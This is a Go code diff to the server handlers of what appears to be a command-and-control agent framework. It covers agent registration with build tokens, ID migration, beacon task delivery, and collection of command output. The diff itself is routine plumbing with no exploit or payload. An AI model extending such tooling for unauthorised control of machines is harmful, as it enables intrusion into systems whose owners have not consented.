@@ -45,7 +45,7 @@ func AgentRegister(c *gin.Context) {
 		input.Fingerprint = input.ID
 	}
 
-	// Validate build token if provided
+	var validatedBuildToken string
 	if input.BuildToken != "" {
 		var bt repo.BuildToken
 		now := time.Now()
@@ -54,8 +54,7 @@ func AgentRegister(c *gin.Context) {
 			c.JSON(http.StatusForbidden, gin.H{"ok": false, "error": "invalid build token"})
 			return
 		}
-		// Mark token as used
-		repo.DB.Model(&bt).Update("used_at", now)
+		validatedBuildToken = bt.Token
 	}
 
 	log.Info().Str("ip", c.ClientIP()).Str("id", input.ID).Str("fp", input.Fingerprint).
@@ -68,17 +67,36 @@ func AgentRegister(c *gin.Context) {
 	if err := repo.DB.First(&client, "id = ?", input.ID).Error; err != nil {
 		// 2) Fallback: search by fingerprint
 		if err2 := repo.DB.Where("fingerprint = ?", input.Fingerprint).First(&client).Error; err2 != nil {
-			// Truly new agent
 			isNew = true
 			client.ID = input.ID
 			client.Fingerprint = input.Fingerprint
 			client.FirstSeen = time.Now()
 		}
-		// Found by fingerprint — keep its fingerprint, update id
-		// (id may have changed due to re-generation)
 	}
 
-	// Update mutable fields — never overwrite Fingerprint if already set
+	oldID := client.ID
+	if !isNew && oldID != input.ID {
+		// Same fingerprint / logical agent, new generated id — migrate PK and FKs
+		if err := repo.DB.Transaction(func(tx *gorm.DB) error {
+			if err := tx.Model(&repo.Task{}).Where("client_id = ?", oldID).Update("client_id", input.ID).Error; err != nil {
+				return err
+			}
+			if err := tx.Model(&repo.Result{}).Where("client_id = ?", oldID).Update("client_id", input.ID).Error; err != nil {
+				return err
+			}
+			if err := tx.Model(&repo.Client{}).Where("id = ?", oldID).Update("id", input.ID).Error; err != nil {
+				return err
+			}
+			return nil
+		}); err != nil {
+			log.Error().Err(err).Str("old", oldID).Str("new", input.ID).Msg("client id migration failed")
+			c.JSON(http.StatusInternalServerError, gin.H{"error": "db error"})
+			return
+		}
+		client.ID = input.ID
+	}
+
+	// Update mutable fields — never overwrite Fingerprint once set
 	client.Hostname = input.Hostname
 	client.Username = input.Username
 	client.OS = input.OS
@@ -95,6 +113,11 @@ func AgentRegister(c *gin.Context) {
 		log.Error().Err(err).Str("id", input.ID).Msg("failed to save client")
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "db error"})
 		return
+	}
+
+	if validatedBuildToken != "" {
+		now := time.Now()
+		repo.DB.Model(&repo.BuildToken{}).Where("token = ?", validatedBuildToken).Update("used_at", now)
 	}
 
 	Broadcast(gin.H{
@@ -168,7 +191,7 @@ func AgentBeacon(c *gin.Context) {
 		GlobalHub.BroadcastSystem("TASK: delivering " + strconv.Itoa(len(tasks)) + " task(s) to " + input.ID)
 	}
 
-	c.JSON(http.StatusOK, gin.H{"t": tasks})
+	c.JSON(http.StatusOK, gin.H{"t": tasks, "tasks": tasks})
 }
 
 // AgentResult handles command output from agents
@@ -178,11 +201,21 @@ func AgentResult(c *gin.Context) {
 		TaskID string `json:"task_id"`
 		Tag    string `json:"tag"`
 		Data   string `json:"data"`
+		Output string `json:"output"`
 	}
 
 	if err := c.ShouldBindJSON(&input); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"ok": false})
 		return
+	}
+	if input.Data == "" && input.Output != "" {
+		input.Data = input.Output
+	}
+	if input.ID == "" {
+		input.ID = c.GetHeader("X-ID")
+		if input.ID == "" {
+			input.ID = c.GetHeader("X-Client-ID")
+		}
 	}
 
 	taskType := "result"
